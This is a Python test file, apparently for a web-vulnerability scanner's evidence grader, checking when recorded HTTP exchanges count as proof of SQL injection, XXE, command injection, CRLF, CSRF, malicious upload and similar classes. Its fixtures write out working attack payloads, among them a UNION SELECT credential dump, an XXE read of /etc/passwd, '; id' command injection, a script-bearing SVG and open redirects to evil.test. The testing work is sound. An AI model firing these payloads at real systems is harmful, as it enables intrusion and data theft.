    # missing out-of-band collector rather than a missing verifier
    for name in ("ssrf",):
        v = proof.grade(name, "Page A unique", [a, b])
        assert v.grade == "candidate", f"{name} graded {v.grade}"
        assert proof.spec_for(name).ceiling == "candidate"
    for left in ("crlf", "method", "upload", "race", "websocket",
                 "smuggle"):
        v = proof.grade(left, "Page A unique", [a, b])
        assert v.grade == "unproven", \
            f"{left} graded {v.grade} on two stray pages"
        assert proof.spec_for(left).ceiling == "", \
            f"{left} has a real verifier now; a ceiling would hold it down"


def test_jwt_needs_the_same_endpoint_and_a_different_credential():
    """Any Cookie-bearing 2xx plus any 401 anywhere graded jwt proven - and
    every browser-shaped request carries a Cookie."""
    api = ex("b8", "http://t.local/api/me", '{"role":"admin"}', 200,
             req_headers={"cookie": "session=abc"})
    logout = ex("b9", "http://t.local/logout", "unauthorized", 401)
    assert proof.grade("jwt", '{"role":"admin"}',
                       [api, logout, FORGE_EVENT]).grade != "proven"
    same = ex("b10", "http://t.local/api/me", "invalid signature", 401,
              req_headers={"cookie": "session=tampered"})
    assert proof.grade("jwt", '{"role":"admin"}',
                       [api, same, FORGE_EVENT]).grade == "proven"


def test_idor_is_not_pagination():
    """`/page/1` and `/page/2` differ, so they graded broken access control."""
    p1 = ex("b11", "http://t.local/page/1", "<html>Articles page 1: alpha</html>")
    p2 = ex("b12", "http://t.local/page/2", "<html>Articles page 2: beta</html>")
    assert proof.grade("idor", "page 2: beta", [p1, p2]).grade == "unproven"
    mine = ex("b13", "http://t.local/api/user/1", '{"id":1,"username":"me"}')
    theirs = ex("b14", "http://t.local/api/user/2",
                '{"id":2,"username":"admin","email":"a@b.c"}')
    assert proof.grade("idor", '"username":"admin"',
                       [mine, theirs]).grade == "proven"


def test_disclosure_ignores_placeholder_credentials():
    """An install document full of `password=changeme` graded proven."""
    doc = ex("b15", "http://t.local/install.md",
             "<pre>password=changeme\napi_key=YOUR_KEY_HERE\n"
             "token=${TOKEN}</pre>")
    for quote in ("password=changeme", "api_key=YOUR_KEY_HERE", "token=${TOKEN}"):
        assert proof.grade("disclosure", quote, [doc]).grade == "unproven", quote
    real = ex("b16", "http://t.local/.env", "SECRET_KEY=lab-secret-0123\n")
    assert proof.grade("disclosure", "SECRET_KEY=lab-secret-0123",
                       [real]).grade == "proven"


def test_redirect_needs_the_destination_to_come_from_the_request():
    """An apex-to-www hop is off origin too, and graded as the finding."""
    apex = ex("b17", "http://t.local/go", "", 302,
              headers={"location": "https://www.t.local/"})
    assert proof.grade("redirect", "", [apex]).grade == "unproven"
    supplied = ex("b18", "http://t.local/go?next=http://evil.test/", "", 302,
                  headers={"location": "http://evil.test/"})
    home = ex("b19", "http://t.local/go?next=/home", "", 302,
              headers={"location": "/home"})
    assert proof.grade("redirect", "", [supplied, home]).grade == "proven"


def test_cors_allowlist_working_is_not_a_finding():
    """The verifier never compared the Origin with the request's own host, so
    a correct allowlist echoing the site's origin graded proven."""
    own = ex("b20", "http://t.local/api/data", "{}", 200,
             headers={"access-control-allow-origin": "http://t.local",
                      "access-control-allow-credentials": "true"},
             req_headers={"origin": "http://t.local"})
    assert proof.grade("cors", "{}", [own]).grade == "unproven"
    foreign = ex("b21", "http://t.local/api/data", "{}", 200,
                 headers={"access-control-allow-origin": "http://evil.test",
                          "access-control-allow-credentials": "true"},
                 req_headers={"origin": "http://evil.test"})
    assert proof.grade("cors", "{}", [foreign]).grade == "proven"


def test_csrf_needs_a_tokenless_cross_origin_write():
    """Any GET plus any POST plus any difference graded csrf - that is a web
    site, not a finding."""
    # explicit stamps: each write has to sit BETWEEN the two reads, because
    # that is the sequence the claim describes. Left to creation order,
    # `cross` and `tokened` are built after `after` and so are recorded
    # after it - and a write that followed the read it supposedly caused is
    # correctly refused.
    before = ex("b22", "http://t.local/settings", "<p>email: old@x.test</p>",
                ts=10.0)
    write = ex("b23", "http://t.local/settings/update-email", "ok", 200,
               method="POST", req_body="email=new@evil.test", ts=11.0)
    after = ex("b24", "http://t.local/settings", "<p>email: new@evil.test</p>",
               ts=12.0)
    assert proof.grade("csrf", "new@evil.test",
                       [before, write, after]).grade != "proven"
    cross = ex("b25", "http://t.local/settings/update-email", "ok", 200,
               method="POST", req_body="email=new@evil.test",
               req_headers={"origin": "http://evil.test"}, ts=11.0)
    assert proof.grade("csrf", "new@evil.test",
                       [before, cross, after]).grade == "proven"
    # ...and the same write recorded AFTER the read it is claimed to have
    # caused is not a finding
    late = ex("b25b", "http://t.local/settings/update-email", "ok", 200,
              method="POST", req_body="email=new@evil.test",
              req_headers={"origin": "http://evil.test"}, ts=99.0)
    assert proof.grade("csrf", "new@evil.test",
                       [before, late, after]).grade != "proven"
    tokened = ex("b26", "http://t.local/settings/update-email", "ok", 200,
                 method="POST",
                 req_body="email=new@evil.test&csrf_token=abc",
                 req_headers={"origin": "http://evil.test"}, ts=11.0)
    assert proof.grade("csrf", "new@evil.test",
                       [before, tokened, after]).grade != "proven"


def test_cache_pair_must_be_the_same_resource():
    """A reflected search term that also appears on another page graded cache
    poisoning."""
    search = ex("b27", "http://t.local/search?q=evil.attacker.test",
                "<p>Results for evil.attacker.test</p>")
    other = ex("b28", "http://t.local/sitemap",
               "<a href='http://evil.attacker.test'>x</a>")
    assert proof.grade("cache", "evil.attacker.test",
                       [search, other]).grade == "unproven"
    poisoner = ex("b29", "http://t.local/cached", "ok", 200,
                  req_headers={"x-forwarded-host": "evil.attacker.test"})
    victim = ex("b30", "http://t.local/cached",
                "<link href='http://evil.attacker.test/a.css'>")
    assert proof.grade("cache-poisoning", "evil.attacker.test",
                       [poisoner, victim]).grade == "proven"


def test_mass_assignment_and_prototype_pollution_have_their_own_classes():
    """Both were graded by verifiers that know nothing about fields."""
    assert proof.canonical("mass-assignment") == "massassign"
    assert proof.canonical("prototype-pollution") == "ppoll"
    # and ppoll is now provable from what its own probe collects
    pollute = ex("b31p", "http://t.local/api/config", '{"merged":true}', 200,
                 method="POST",
                 req_body='{"__proto__":{"argusmark1":"polluted"}}')
    read = ex("b31r", "http://t.local/api/config",
              '{"theme":"dark","argusmark1":"polluted"}')
    assert proof.grade("prototype-pollution", "argusmark1",
                       [pollute, read]).grade == "proven"
    write = ex("b31", "http://t.local/api/register", '{"id":9}', 200,
               method="POST", req_body='{"user":"x","is_admin":true}')
    read = ex("b32", "http://t.local/api/user/9",
              '{"id":9,"user":"x","is_admin":true}')
    assert proof.grade("massassign", '"is_admin":true',
                       [write, read]).grade == "proven"
    # citing only the write proves nothing: the quoted bytes are not in its
    # response, which is what the verbatim gate itself requires
    assert proof.grade("massassign", '"is_admin":true',
                       [write]).grade == "unproven"


def test_graphql_has_a_verifier_it_can_pass():
    """It was graded by the extraction verifier, which wants a FROM clause a
    GraphQL query never sends - so the class was unprovable."""
    q = ex("b33", "http://t.local/graphql",
           '{"data":{"__schema":{"types":[{"name":"User"}]}}}', 200,
           method="POST", req_body='{"query":"{__schema{types{name}}}"}')
    assert proof.grade("graphql", '"types":[', [q]).grade == "proven"


def test_upgrade_keeps_the_original_timestamp_and_the_new_metadata(tmp_path):
    """`ts` is when the finding was FIRST recorded and
    time_to_first_finding_s is computed from it; the upgrade rewrote it to the
    upgrade time and discarded the upgrading author's cvss and agent."""
    import time
    s = _sess(tmp_path)
    r1 = s.record_exchange("probe_sqli",
                           {"method": "GET", "url": "http://t.local/i?id=1'"},
                           {"status": 500, "headers": {},
                            "body": "sqlite3.OperationalError: near"})
    first = s.add_finding(
        "sqli", "high", "sqli", "http://t.local/i?id=1", [r1],
        "sqlite3.OperationalError", "d", "r", agent="exploit-1",
        cvss="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N")
    original_ts = first["ts"]
    time.sleep(0.01)
    r2 = s.record_exchange(
        "http_request",
        {"method": "GET", "url": "http://t.local/i?id=1' UNION SELECT a,b "
                                 "FROM users LIMIT 5-- -"},
        {"status": 200, "headers": {}, "body": "<li>admin - s3cr3t</li>"})
    up = s.add_finding(
        "sqli", "critical", "sqli", "http://t.local/i?id=1", [r1, r2],
        "admin - s3cr3t", "dumped", "bind", agent="exploit-2",
        cvss="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H")
    assert up["grade"] == "proven"
    assert up["ts"] == original_ts
    assert up["upgraded_ts"] > original_ts
    assert up["agent"] == "exploit-2"
    assert up["cvss"].endswith("C:H/I:H/A:H")


def test_upgrade_keeps_the_superseded_citation(tmp_path):
    """The upgrade replaced evidence_ids wholesale, so a second worker's
    better evidence erased the first worker's reference."""
    s = _sess(tmp_path)
    r1 = s.record_exchange("probe_cmdi",
                           {"method": "GET",
                            "url": "http://t.local/p?h=1;%20sleep%204"},
                           {"status": 200, "headers": {}, "body": "PING ok"})
    s.add_finding("cmdi", "high", "rce", "http://t.local/p", [r1],
                  "PING ok", "timing only", "r")
    r2 = s.record_exchange(
        "probe_cmdi",
        {"method": "GET",
         "url": "http://t.local/p?h=1;%20id;%20echo%20argus7k2m9x"},
        {"status": 200, "headers": {},
         "body": "uid=0(root) gid=0(root)\nargus7k2m9x"})
    up = s.add_finding("cmdi", "critical", "rce", "http://t.local/p", [r2],
                       "uid=0(root) gid=0(root)", "output", "argv")
    assert up["grade"] == "proven"
    assert r1 in up["superseded_evidence_ids"]


def test_auto_resolution_prefers_an_exchange_over_an_event(tmp_path):
    """The most recent match can be a scanner's output line, and citing that
    fails the wire check for every class - so a provable finding came back
    unproven because an external_result quoted the same bytes."""
    s = _sess(tmp_path)
    wire = s.record_exchange(
        "http_request",
        {"method": "GET", "url": "http://t.local/i?id=1' UNION SELECT a,b "
                                 "FROM users LIMIT 5-- -"},
        {"status": 200, "headers": {}, "body": "<li>admin - s3cr3t</li>"})
    event = s.record_event("external_result",
                           {"output": "sqlmap says: admin - s3cr3t"})
    f = s.add_finding("sqli", "high", "nosqli", "http://t.local/i", [],
                      "admin - s3cr3t", "d", "r")
    assert f["evidence_ids"] == [wire], f"cited {f['evidence_ids']}, not {wire}"
    assert event not in f["evidence_ids"]


def test_sarif_does_not_promote_an_unknown_grade_to_a_failure(tmp_path):
    """_KIND defaulted to "fail", so an ungraded legacy row - or a row whose
    grade was edited to something unrecognized - broke a CI build."""
    from argus.report.sarif import _KIND
    assert _KIND.get("candidate") == "review"
    assert _KIND.get("proven") == "fail"
    import inspect
    from argus.report import sarif
    src = inspect.getsource(sarif.render_sarif)
    assert '_KIND.get(grade, "review")' in src


# --- coverage, measured rather than assumed ---------------------------------

CANNOT_BE_PROVEN_HERE = {
    "xss": "no browser",
    "ssrf": "no collector",
    "dos": "refused by construction",
}


def test_crlf_is_proven_by_a_header_the_request_created():
    """`crlf` came off the CANNOT_BE_PROVEN_HERE list.

    The old note read "the verifier compares bodies, not headers" - true of
    the verifier it had, and the wrong place to stop: the transcript records
    response headers as a dict, so the real artifact is checkable. All four
    directions are asserted, and the third is the one that matters.
    """
    inject = ex("r1", "http://t.local/r?next=%2Fhome%0d%0aX-Argus-Crlf%3A%20argusab12cd",
                "redirecting", headers={"server": "nginx",
                                        "x-argus-crlf": "argusab12cd"})
    control = ex("r2", "http://t.local/r?next=%2Fhome", "redirecting",
                 headers={"server": "nginx"})
    assert proof.grade("crlf", "x-argus-crlf: argusab12cd",
                       [inject, control]).grade == "proven"

    # 1. reflected into the BODY only is not header control
    body_only = ex("r3", "http://t.local/r?next=%0d%0aX-Argus-Crlf%3A%20argusab12cd",
                   "bad next value: X-Argus-Crlf: argusab12cd",
                   headers={"server": "nginx"})
    verdict = proof.grade("crlf", "X-Argus-Crlf: argusab12cd",
                          [body_only, control])
    assert verdict.grade != "proven"
    assert "the response carries it as a header" in verdict.missing

    # 2. a header the server sends anyway is not one the request created
    named = ex("r4", "http://t.local/r?next=%0d%0aX-Cache%3A%20HIT", "x",
               headers={"x-cache": "HIT"})
    always = ex("r5", "http://t.local/r?next=%2Fhome", "x",
                headers={"x-cache": "HIT"})
    verdict = proof.grade("crlf", "x-cache: HIT", [named, always])
    assert verdict.grade != "proven"
    assert "a control response does not carry it" in verdict.missing

    # 3. no control at all
    assert proof.grade("crlf", "x-argus-crlf: argusab12cd",
                       [inject]).grade != "proven"

    # 4. a bare CRLF with nothing after it splits nothing
    bare = ex("r6", "http://t.local/r?next=%0d%0a", "x",
              headers={"server": "nginx"})
    verdict = proof.grade("crlf", "server: nginx", [bare, control])
    assert verdict.grade != "proven"
    assert "the request asked for a header" in verdict.missing


def test_probe_crlf_sends_the_control_the_requirement_needs():
    import inspect
    from argus.tools import probes
    src = inspect.getsource(probes.probe_crlf)
    assert "clean control" in src, (
        "the crlf requirement needs a control response; a probe that never "
        "sends one cannot produce evidence that grades proven")
    assert src.index("control = _send") < src.index("hdr_inj = _send"), \
        "the control should be sent before the payload"


def test_method_is_proven_by_an_effect_not_by_a_status():
    """`method` came off the CANNOT_BE_PROVEN_HERE list.

    The note read "a status difference is not an effect" - right about the
    verifier it had, wrong about the evidence: `probe_method` already records
    both shapes of effect this class can have, and both are pairs.
    """
    # the OPTIONS is not decoration: without something on record saying this
    # endpoint should refuse PUT, a REST API honouring PUT on its own
    # resource would grade as verb tampering
    opts = ex("r0", "http://t.local/up/argusputab12.txt", "", 200,
              method="OPTIONS", headers={"allow": "GET, HEAD, POST"})
    put = ex("r1", "http://t.local/up/argusputab12.txt", "", 201,
             method="PUT", req_body="argus method probe argusputab12")
    get = ex("r2", "http://t.local/up/argusputab12.txt",
             "argus method probe argusputab12")
    assert proof.grade("method", "argus method probe argusputab12",
                       [opts, put, get]).grade == "proven"

    # and the same pair WITHOUT that evidence does not grade
    verdict = proof.grade("method", "argus method probe argusputab12",
                          [put, get])
    assert verdict.grade != "proven"
    assert ("a method the endpoint should refuse was honoured"
            in verdict.missing)

    # a 201 on a write whose body was discarded is not an effect
    gone = ex("r3", "http://t.local/up/argusputab12.txt",
              "<h1>404 not found</h1>", 404)
    verdict = proof.grade("method", "argus method probe argusputab12",
                          [opts, put, gone])
    assert verdict.grade != "proven"
    assert "the method had an observable effect" in verdict.missing

    # the status alone, with no read-back cited
    assert proof.grade("method", "201 Created", [opts, put]).grade != "proven"

    # a read-back of a DIFFERENT path proves nothing about what was written
    other = ex("r4", "http://t.local/up/other.txt",
               "argus method probe argusputab12")
    assert proof.grade("method", "argus method probe argusputab12",
                       [opts, put, other]).grade != "proven"


def test_trace_is_proven_by_echoing_a_header_the_probe_sent():
    trace = ex("r5", "http://t.local/", "TRACE / HTTP/1.1\nHost: t.local\n"
               "X-Argus-Trace: argustrzz99", method="TRACE",
               req_headers={"host": "t.local",
                            "x-argus-trace": "argustrzz99"})
    assert proof.grade("method", "X-Argus-Trace: argustrzz99",
                       [trace]).grade == "proven"

    # TRACE answered, but the echo carries no nonce this probe sent - so the
    # echo cannot be tied to it
    bare = ex("r6", "http://t.local/", "TRACE / HTTP/1.1", method="TRACE",
              req_headers={"host": "t.local",
                           "x-argus-trace": "argustrzz99"})
    verdict = proof.grade("method", "TRACE / HTTP/1.1", [bare])
    assert verdict.grade != "proven"
    assert "the method had an observable effect" in verdict.missing


def test_a_mere_status_difference_is_not_a_method_finding():
    allowed = ex("r7", "http://t.local/x", "ok")
    refused = ex("r8", "http://t.local/x", "no", 405, method="DELETE")
    verdict = proof.grade("method", "ok", [allowed, refused])
    assert verdict.grade != "proven"
    assert "a method the endpoint should refuse was honoured" in verdict.missing


def test_probe_method_puts_its_canary_in_the_bytes_it_writes():
    """The read-back check tested nothing before this.

    `put_verified` looked for the canary FILENAME in the GET response body,
    but the body written was the fixed string "argus method probe" - so a
    server that stored the file correctly returned bytes the check could not
    recognise, and a PUT that really landed read as unverified.
    """
    import inspect
    from argus.tools import probes
    src = inspect.getsource(probes.probe_method)
    assert 'body=f"argus method probe {canary}"' in src
    assert '_marker("argusput")' in src, \
        "the canary must match proof.NONCE_RE for the verifier to tie it back"
    assert proof.NONCE_RE.search("argusput" + "a1b2c3d4")


_UPLOAD_NONCE = "argusupl9f3a"
_UPLOAD_SVG = ("<svg xmlns=\"http://www.w3.org/2000/svg\">"
               f"<script>/*{_UPLOAD_NONCE}*/alert(1)</script></svg>")
_UPLOAD_POST = (
    "--b\r\nContent-Disposition: form-data; name=\"file\"; "
    f"filename=\"{_UPLOAD_NONCE}.svg\"\r\n"
    f"Content-Type: image/svg+xml\r\n\r\n{_UPLOAD_SVG}\r\n--b--\r\n")


def _upload_pair(ctype: str, disposition: str = "", status: int = 200):
    up = ex("r1", "http://t.local/upload",
            '{"url": "/files/%s.svg"}' % _UPLOAD_NONCE, 201,
            method="POST", req_body=_UPLOAD_POST)
    headers = {"content-type": ctype}
    if disposition:
        headers["content-disposition"] = disposition
    fetch = ex("r2", f"http://t.local/files/{_UPLOAD_NONCE}.svg",
               _UPLOAD_SVG, status, headers=headers)
    return up, fetch


def test_upload_is_proven_by_how_it_is_served_not_by_what_it_is_called():
    """`upload` came off the CANNOT_BE_PROVEN_HERE list.

    The note read "serving is not executing" - true, and the requirement
    sentence already handled execution by saying it is an rce finding graded
    as one. What was left unproven was the thing this evidence settles: a
    file served back with its bytes intact AND a content-type that makes
    those bytes script. The content-type was the one part nothing checked.
    """
    assert proof.grade("upload", _UPLOAD_SVG,
                       list(_upload_pair("image/svg+xml"))).grade == "proven"

    # the same bytes, inert
    for ctype in ("text/plain; charset=utf-8", "application/octet-stream",
                  "image/png", ""):
        verdict = proof.grade("upload", _UPLOAD_SVG,
                              list(_upload_pair(ctype)))
        assert verdict.grade != "proven", f"{ctype!r} graded {verdict.grade}"
        assert "served with a content-type a browser acts on" in \
            verdict.missing

    # active type, but the browser is told to download it
    verdict = proof.grade("upload", _UPLOAD_SVG, list(_upload_pair(
        "image/svg+xml", disposition='attachment; filename="x.svg"')))
    assert verdict.grade != "proven"

    # stored path answers 404 - nothing was served
    verdict = proof.grade("upload", _UPLOAD_SVG,
                          list(_upload_pair("image/svg+xml", status=404)))
    assert verdict.grade != "proven"
    assert "it is served back with the bytes intact" in verdict.missing

    # an ordinary html page with no upload in evidence
    page = ex("r9", "http://t.local/a", "<html>hi</html>",
              headers={"content-type": "text/html"})
    verdict = proof.grade("upload", "<html>hi</html>", [page])
    assert verdict.grade != "proven"
    assert "a file was uploaded with a probe nonce in it" in verdict.missing


def test_the_upload_fetch_must_return_this_uploads_own_bytes():
    up, _ = _upload_pair("image/svg+xml")
    someone_elses = ex("r3", "http://t.local/files/other.svg",
                       "<svg><script>alert(1)</script></svg>",
                       headers={"content-type": "image/svg+xml"})
    verdict = proof.grade("upload", "<svg><script>alert(1)</script></svg>",
                          [up, someone_elses])
    assert verdict.grade != "proven"
    assert "it is served back with the bytes intact" in verdict.missing


def test_a_confirmation_page_that_names_the_upload_is_not_the_stored_file():
    """"The nonce came back" does not distinguish the file from a page.

    An "Upload complete - saved <your svg>" page carries the nonce too, and
    served as text/html it satisfied every other check in this verifier. Only
    comparing against the bytes actually sent separates them.
    """
    up, _ = _upload_pair("image/svg+xml")
    confirmation = ex(
        "r2", f"http://t.local/files/{_UPLOAD_NONCE}.svg",
        f"<html><body><h1>Upload complete</h1><p>saved {_UPLOAD_SVG}</p>"
        "<p>Thanks for using our service.</p></body></html>",
        headers={"content-type": "text/html"})
    verdict = proof.grade("upload", _UPLOAD_SVG, [up, confirmation])
    assert verdict.grade != "proven", verdict.explain()
    assert "it is served back with the bytes intact" in verdict.missing

    # the same bytes served AS the response body are the stored file
    stored = ex("r3", f"http://t.local/files/{_UPLOAD_NONCE}.html",
                _UPLOAD_SVG, headers={"content-type": "text/html"})
    assert proof.grade("upload", _UPLOAD_SVG, [up, stored]).grade == "proven"


def test_the_content_type_check_does_not_call_an_active_type_inert():
    """A wrong reason sends a reader to fix the wrong thing.

    The detail read "served as text/html - inert" whenever an earlier check
    failed, which is a false statement about a type a browser does act on.
    """
    up, _ = _upload_pair("image/svg+xml")
    # the surrounding page has to dominate, or this IS the served file - the
    # verifier's test is proportional, which is a heuristic and the only one
    # available: "the nonce came back" cannot tell a file from a page about it
    page = ex("r2", f"http://t.local/files/{_UPLOAD_NONCE}.svg",
              "<html><head><title>Upload complete</title></head><body>"
              "<h1>Thanks</h1><p>Your file was received and queued for "
              "review by a moderator. You will be notified by email once it "
              f"has been approved.</p><pre>saved as {_UPLOAD_SVG}</pre>"
              "<footer>Example Corp - all rights reserved</footer>"
              "</body></html>", headers={"content-type": "text/html"})
    verdict = proof.grade("upload", _UPLOAD_SVG, [up, page])
    detail = next(c["detail"] for c in verdict.checks
                  if c["check"] == "served with a content-type a browser "
                                   "acts on")
    assert "inert" not in detail, detail
    assert "would be acted on" in detail

    # and an actually-inert type still says so
    _, inert = _upload_pair("application/octet-stream")
    verdict = proof.grade("upload", _UPLOAD_SVG, [up, inert])
    detail = next(c["detail"] for c in verdict.checks
                  if c["check"] == "served with a content-type a browser "
                                   "acts on")
    assert "inert" in detail, detail


def test_probe_upload_records_how_the_file_came_back():
    """The probe called a `.svg` served as text/plain an upload candidate.

    "An active file type was stored" is not the finding; "it is served as
    something a browser runs" is. Nothing downstream can recover the
    content-type, so the probe has to record it.
    """
    import inspect
    from argus.tools import probes
    src = inspect.getsource(probes.probe_upload)
    assert '_marker("argusupl")' in src, \
        "the canary must match proof.NONCE_RE or the gate cannot tie it back"
    for field in ("served_ctype", "served_disposition", "served_active"):
        assert field in src, field
    assert 'r["name"] != "control-txt"' in src, \
        "the control upload exists to show storage works; it is not a finding"


def _race(rid, ts, elapsed, status=200, body="ok",
          url="http://t.local/redeem"):
    return {"id": rid, "ts": ts,
            "request": {"method": "POST", "url": url,
                        "headers": {"host": "t.local"}, "body": "code=X"},
            "response": {"status": status, "headers": {}, "body": body,
                         "elapsed_ms": elapsed}}


def test_race_is_proven_by_an_overlap_and_a_refusal():
    """`race` came off the CANNOT_BE_PROVEN_HERE list.

    The note read "no serial control is measured" - true of the verifier and
    false of the probe: `probe_race` sends the serial baseline, and every
    exchange carries `ts` and `elapsed_ms`, so the overlap is reconstructable
    from the record instead of taken on the probe's word.
    """
    burst = [_race("r1", 1000.30, 300), _race("r2", 1000.32, 300),
             _race("r3", 1000.31, 300, status=409, body="already used")]
    serial = [_race("r4", 1001.00, 50, status=409, body="already used"),
              _race("r5", 1001.20, 50, status=409, body="already used")]
    assert proof.grade("race", "ok", burst + serial).grade == "proven"

    # the action is simply repeatable: the serial attempts succeed too
    repeatable = [_race("r4", 1001.00, 50), _race("r5", 1001.20, 50)]
    verdict = proof.grade("race", "ok", burst + repeatable)
    assert verdict.grade != "proven"
    assert "a serial attempt afterwards was refused" in verdict.missing

    # the server serialized the burst - nothing was concurrent
    serialized = [_race("r1", 1000.30, 100), _race("r2", 1000.90, 100),
                  _race("r3", 1001.50, 100)]
    verdict = proof.grade("race", "ok",
                          serialized + [_race("r6", 1002.5, 50, status=409)])
    assert verdict.grade != "proven"
    assert "two attempts were on the wire at once" in verdict.missing

    # one success in a burst is the action working once, as designed
    one = [_race("r1", 1000.30, 300),
           _race("r2", 1000.32, 300, status=409),
           _race("r3", 1000.31, 300, status=409)]
    verdict = proof.grade("race", "ok", one + serial)
    assert verdict.grade != "proven"
    assert "more than one of them succeeded" in verdict.missing


def test_race_fails_closed_when_the_timings_are_missing():
    """A zero-width window overlaps nothing.

    Two entries with the same `ts` and no `elapsed_ms` look simultaneous and
    are not evidence of it - the transcript simply did not record when they
    were on the wire.
    """
    bare = [{"id": "r1", "ts": 1000.3,
             "request": {"method": "POST", "url": "http://t.local/redeem",
                         "headers": {}, "body": ""},
             "response": {"status": 200, "headers": {}, "body": "ok"}},
            {"id": "r2", "ts": 1000.3,
             "request": {"method": "POST", "url": "http://t.local/redeem",
                         "headers": {}, "body": ""},
             "response": {"status": 200, "headers": {}, "body": "ok"}}]
    verdict = proof.grade("race", "ok", bare)
    assert verdict.grade != "proven"
    assert "two attempts were on the wire at once" in verdict.missing


def test_overlap_is_computed_from_the_recorded_window_not_the_order():
    a = _race("r1", 1000.30, 300)      # on the wire 1000.00 - 1000.30
    b = _race("r2", 1000.70, 300)      # on the wire 1000.40 - 1000.70
    assert not proof._overlaps(a, b), "adjacent is not concurrent"
    c = _race("r3", 1000.40, 300)      # 1000.10 - 1000.40
    assert proof._overlaps(a, c)
    assert proof._window(a) == (1000.0, 1000.30)


def test_probe_race_tells_the_agent_to_cite_the_serial_baseline():
    import inspect
    import re
    from argus.tools import probes
    # Adjacent string literals are joined before matching: the message is
    # wrapped across several of them, so a phrase that reads continuously to
    # the agent straddles a boundary in the source. Asserting on raw source
    # made this test fail on a reflow that changed nothing the agent sees.
    src = re.sub(r'"\s*\n\s*"', "",
                 inspect.getsource(probes.probe_race))
    assert "serial baseline" in src
    assert "the refusal is what shows there was a limit" in src


def test_every_class_either_has_a_proven_test_or_declares_it_cannot():
    """The honest coverage statement. A class with no positive test is either
    a gap or a cap, and the difference has to be written down - an auditor
    measured 12 classes with no `proven` assertion and could not tell which
    were which."""
    import pathlib
    import re
    src = pathlib.Path(__file__).read_text(encoding="utf-8")
    covered = set()
    for m in re.finditer(r'grade\(\s*["\']([a-z-]+)["\'][\s\S]{0,260}?=="?\s*'
                         r'"proven"', src):
        covered.add(proof.canonical(m.group(1)))
    for name in proof.classes():
        if name in covered:
            continue
        assert name in CANNOT_BE_PROVEN_HERE, \
            f"{name} has no test asserting `proven` and no declared reason"
        spec = proof.spec_for(name)
        assert spec.ceiling == "candidate" or spec.verifier is proof.verify_refused, \
            f"{name} is listed as unprovable here but its spec allows `proven`"


@pytest.mark.parametrize("name", sorted(n for n in CANNOT_BE_PROVEN_HERE
                                        if n != "dos"))
def test_a_capped_class_still_reaches_candidate_on_real_evidence(name):
    """A cap must not collapse to "never useful": the class still has to
    register a real difference as a candidate, which is what the report lists
    as work to finish."""
    if name in ("xss", "ppoll"):
        # a browser class needs its own shape: a raw metacharacter surviving
        # into an HTML response, which is the part that IS checkable here
        refl = ex("c3", "http://t.local/s?q=x%3C%3E%27%22",
                  "<html><body>Results for: x<>'\"</body></html>", 200,
                  headers={"content-type": "text/html; charset=utf-8"})
        v = proof.grade(name, "x<>'\"", [refl])
    else:
        a = ex("c1", "http://t.local/x?p=probe", "<html>baseline body</html>")
        b = ex("c2", "http://t.local/x?p=probe2", "<html>the difference</html>")
        v = proof.grade(name, "the difference", [a, b])
    assert v.grade == "candidate", f"{name} graded {v.grade}: {v.explain()}"
    assert v.requirement, name


def test_xxe_reads_a_file_through_the_parser():
    hit = ex("x1", "http://t.local/xml", "root:x:0:0:root:/root:/bin/bash",
             method="POST",
             req_body='<!DOCTYPE r [<!ENTITY e SYSTEM "file:///etc/passwd">]>'
                      '<r>&e;</r>')
    assert proof.grade("xxe", "root:x:0:0", [hit]).grade == "proven"
    # the entity declaration is what makes it this class
    plain = ex("x2", "http://t.local/xml", "root:x:0:0:root:/root:/bin/bash",
               method="POST", req_body="<r>hello</r>")
    assert proof.grade("xxe", "root:x:0:0", [plain]).grade == "unproven"


def test_the_capped_set_is_not_silently_growing():
    """If a class gains a real requirement its cap should come off, and if one
    is capped it must appear above. Either way the list is the statement."""
    capped = {n for n in proof.classes()
              if proof.spec_for(n).ceiling == "candidate"}
    refused = {n for n in proof.classes()
               if proof.spec_for(n).verifier is proof.verify_refused}
    assert capped | refused == set(CANNOT_BE_PROVEN_HERE), (
        f"capped/refused in code: {sorted(capped | refused)}, "
        f"declared here: {sorted(CANNOT_BE_PROVEN_HERE)}")


# --- the second audit, against a frozen tree --------------------------------
#
# The first audit ran while I was fixing, so its refuters mostly reported "the
# claim describes the parent commit". This set came from a tree that held
# still, and every case below graded `proven` or `candidate` on evidence with
# no vulnerability in it.

def test_an_echo_is_not_a_finding_in_any_class():
    """The precondition of every class, which I had implemented twice as a
    per-class detail. One search box echoing its query graded `sqli` and
    `nosqli` **proven**: send `SELECT a,b FROM users -- admin - s3cr3t` and
    quote `admin - s3cr3t` back out of the reflection."""
    import urllib.parse
    for cls, excerpt, payload in [
        ("sqli", "admin - s3cr3t",
         "We use PostgreSQL: SELECT a,b FROM users -- admin - s3cr3t"),
        ("nosqli", '{"user":"admin"}', '{"$ne":null} {"user":"admin"}'),
        ("lfi", "root:x:0:0", "../../etc/passwd root:x:0:0:root:/root"),
        ("xxe", "root:x:0:0",
         '<!ENTITY e SYSTEM "file:///etc/passwd"> root:x:0:0'),
        ("massassign", '"is_admin":true', '{"is_admin":true}'),
        ("disclosure", "SECRET_KEY=lab-secret-0123",
         "SECRET_KEY=lab-secret-0123"),
        ("rce", "uid=0(root) gid=0(root)",
         "; id argus1234 uid=0(root) gid=0(root)"),
    ]:
        e = ex("e1", "http://t.local/s?q=" + urllib.parse.quote_plus(payload),
               f"<html>Results for: {payload}</html>",
               method="POST", req_body=payload)
        v = proof.grade(cls, excerpt, [e])
        assert v.grade == "unproven", f"{cls} graded {v.grade}: {v.explain()}"
        assert "the target produced the quoted bytes" in v.missing, cls


def test_reflection_classes_are_exempt_from_the_echo_veto():
    """xss, prototype pollution and crlf are proven BY the reflection, so the
    veto must not apply to them - a universal rule written without the
    exemption would have deleted three classes."""
    # ppoll left this set: the server-side half - a property only the
    # polluting request sent, observed in a later read - is checkable, and
    # grading it by the browser verifier made the evidence its own probe
    # collects unusable
    for name in ("xss", "crlf"):
        assert proof.spec_for(name).reflection_is_the_finding, name
    refl = ex("e2", "http://t.local/s?q=x%3C%3E%27%22",
              "<html><body>Results for: x<>'\"</body></html>", 200,
              headers={"content-type": "text/html; charset=utf-8"})
    assert proof.grade("xss", "x<>'\"", [refl]).grade == "candidate"


def test_the_defence_working_is_not_a_finding():
    """The worst false positive there is. A write the app REFUSED graded csrf
    and massassign `proven`, and an expired session correctly refused graded
    jwt `proven` - the authorisation check working, reported as forgery."""
